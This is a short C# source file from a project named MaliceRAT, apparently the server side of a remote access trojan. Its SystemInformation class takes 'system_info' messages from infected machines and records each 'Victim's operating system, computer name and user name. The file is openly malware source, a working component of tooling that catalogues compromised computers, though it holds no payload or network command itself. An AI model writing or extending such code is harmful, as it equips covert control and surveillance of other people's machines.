using System;
using System.Net;

namespace MaliceRAT.RatServer.Features
{
    public class SystemInformation
    {
        public event Action<Victim> InfoReceived;

        public SystemInformation(Server server)
        {
            server.MessageReceived += HandleMessage;
        }

        private void HandleMessage(Victim victim, dynamic jsonMessage)
        {
            if (jsonMessage["type"] == "system_info")
            {
                victim.OS = jsonMessage["os"].ToString();
                victim.PC = jsonMessage["pc"].ToString();
                victim.User = jsonMessage["user"].ToString();

                InfoReceived?.Invoke(victim);
            }
        }
    }
}